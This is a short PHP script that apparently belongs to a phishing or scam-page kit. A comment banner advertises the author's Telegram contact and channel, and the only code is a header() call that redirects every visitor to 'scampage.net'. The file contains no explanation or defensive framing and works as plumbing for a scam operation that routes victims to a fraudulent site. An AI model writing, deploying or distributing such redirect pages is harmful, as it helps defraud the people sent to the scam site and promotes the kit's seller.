<?php 
/*
 _________________________________________________
| 						  						  |
|    CONTACT ME NOW : https://t.me/ro0tM8n        |
|                                                 |
| Official Channel : https://t.me/ro0tM8nchannel  |
|_________________________________________________|

*/

header("Location: https://scampage.net/");
?>